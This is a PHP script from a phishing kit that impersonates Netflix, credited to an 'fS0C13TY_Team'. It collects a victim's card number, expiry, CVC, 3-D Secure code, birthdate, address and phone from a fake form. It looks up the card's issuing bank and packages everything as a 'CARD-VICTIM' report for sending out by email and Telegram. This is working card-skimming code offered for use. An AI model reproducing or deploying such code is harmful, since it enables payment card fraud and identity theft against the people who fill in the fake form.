<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * NETFLIX -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 NETFLIX           $#
###############################################

**/

session_start();
include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$NameOnCard = $_SESSION['NameOnCard'] = $_POST['NameOnCard'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];

$expdate = $_SESSION['expdate'] = $_POST['expdate'];
$Securitycode = $_SESSION['Securitycode'] = $_POST['Securitycode'];
$thDSecure = $_SESSION['thDSecure'] = $_POST['thDSecure'];


$birthdate = $_SESSION['birthdate'] = $_POST['birthdate'];
$addres = $_SESSION['addres'] = $_POST['addres'];
$City = $_SESSION['City'] = $_POST['City'];
$State = $_SESSION['State'] = $_POST['State'];
$phoneNumber = $_SESSION['phoneNumber'] = $_POST['phoneNumber'];

$zipCod = $_SESSION['zipCod'] = $_POST['zipCod'];


$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$_SESSION['cnt'] =  $_POST['cnt'];
$cnt=$_POST['cnt'];


$hero .= '
🏠 C A R D - B I L L I N G 🏠
✈️ ADDRESS = '.$_SESSION['addres'].'
🏘 CITY  = '.$_SESSION['City'].'
🏢 STATE  = '.$_SESSION['State'].'
💣 ZIP CODE  = '.$_SESSION['zipCod'].'
👀 IP INFO = '.$_SERVER['REMOTE_ADDR'].'
🏴‍☠️ COUNTRY = '.$country.'/'.$city.'
📞 PHONE  = '.$_SESSION['phoneNumber'].'
💰 C A R D - V I C T I M 💰
👱🏻‍♂️FULL NAME  = '.$_SESSION['NameOnCard'].'
💳 CARD = '.$_SESSION['cardnumber'].'
📅 EXP  = '.$_SESSION['expdate'].'
🔒 CVC = '.$_SESSION['Securitycode'].'
        🦸‍♂️  HERO  🦸‍♂️
';





include("sand_email.php"); 
include("Add_Your_TelegramAPi.php");



?>


